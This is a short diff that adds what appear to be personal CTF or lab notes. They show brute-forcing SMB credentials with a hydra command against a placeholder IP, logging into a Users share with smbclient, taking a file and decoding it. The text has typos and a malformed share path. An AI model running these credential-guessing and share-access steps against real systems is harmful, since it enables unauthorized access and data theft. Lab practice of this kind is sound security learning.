@@ -1,0 +1,14 @@
+find username and password
+---------------------------
+hydra -L usertxtfile.txt -P passordtxtfile.txt ip smb
+
+#once u got username and password
+
+smbclient //ip.Users -U username
+
+#u will get the access
+
+#gte the file
+
+# decode using bc text encoder
+
